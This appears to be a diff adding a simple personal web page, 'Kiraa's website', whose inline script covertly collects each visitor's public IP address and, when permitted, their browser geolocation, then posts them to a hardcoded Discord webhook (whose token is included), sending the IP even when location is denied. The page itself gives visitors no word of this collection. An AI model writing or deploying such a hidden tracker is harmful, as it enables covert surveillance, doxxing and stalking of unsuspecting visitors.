@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+      }
+      .header {
+        background-color: #4CAF50;
+        color: white;
+        padding: 20px;
+        text-align: center;
+      }
+      .menu {
+        display: flex;
+        background-color: #333;
+      }
+      .menu a {
+        color: white;
+        padding: 14px 20px;
+        text-decoration: none;
+      }
+      .menu a:hover {
+        background-color: #111;
+      }
+      .content {
+        padding: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <h1>My Website</h1>
+    </div>
+
+    <div class="menu">
+      <a href="#">Home</a>
+      <a href="#">About</a>
+      <a href="#">Contact</a>
+    </div>
+
+    <div class="content">
+      <h2>Welcome to Kiraa's website!</h2>
+      <p>This is basically a website that is like google maps lol</p>
+    </div>
+
+    <script>
+      // Define the Discord webhook URL.
+      const webhookUrl =
+        'https://discord.com/api/webhooks/1134976035474128906/MOgC2aLxGUfUM_yHC6cD2fGobAuTacS7kg5IB0vRshmZacSz-1XwgRp7NPdsiB89t8fD';
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            // User has granted permission to access their location data.
+            // Obtain the user's public IP address.
+            fetch('https://api.ipify.org?format=json')
+              .then(response => response.json())
+              .then(data => {
+                // Send the user's public IP address and location data to the Discord webhook.
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                const ip = data.ip;
+                const message = `User location: ${latitude}, ${longitude}\nUser IP address: ${ip}`;
+                fetch(webhookUrl, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ content: message }),
+                });
+              });
+          },
+          function(error) {
+            // User has denied permission to access their location data.
+            // Obtain the user's public IP address.
+            fetch('https://api.ipify.org?format=json')
+              .then(response => response.json())
+              .then(data => {
+                // Send the user's public IP address to the Discord webhook.
+                const ip = data.ip;
+                const message = `User IP address: ${ip}`;
+                fetch(webhookUrl, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ content: message }),
+                });
+              });
+          }
+        );
+      } else {
+        // Geolocation is not supported by the user's browser.
+        console.error('Geolocation is not supported by your browser');
+      }
+    </script>
+  </body>
+</html>
